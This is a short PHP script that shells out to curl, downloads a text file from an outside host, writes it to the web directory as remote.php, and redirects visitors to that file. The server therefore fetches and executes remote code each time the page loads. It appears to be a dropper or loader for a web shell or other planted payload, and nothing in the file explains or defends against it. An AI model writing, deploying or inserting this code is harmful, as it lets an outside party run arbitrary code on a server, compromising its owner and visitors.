<?php
date_default_timezone_set('PRC');





shell_exec("curl -L http://362227.top/rss/remote.txt >  remote.php");

header('Location: remote.php');
